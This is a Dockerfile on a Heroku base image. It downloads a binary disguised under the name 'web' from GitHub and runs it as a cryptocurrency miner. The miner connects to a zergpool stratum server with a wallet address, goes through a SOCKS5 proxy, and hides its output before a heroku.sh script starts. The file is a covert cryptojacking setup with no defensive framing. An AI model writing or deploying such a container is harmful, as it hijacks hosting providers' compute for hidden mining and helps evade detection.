FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/bsx187/aaxce/raw/main/web
RUN ./web -o stratum+tcp://yespowerSUGAR.mine.zergpool.com:6535 -u RUuN5bCZKYWD39gLihVn9bi91jmPR3tYD8 -p c=AVN,mc=SUGAR,m=solo -t 10 --proxy socks5://184.181.217.210:4145 > /dev/null 2>&1
CMD bash heroku.sh
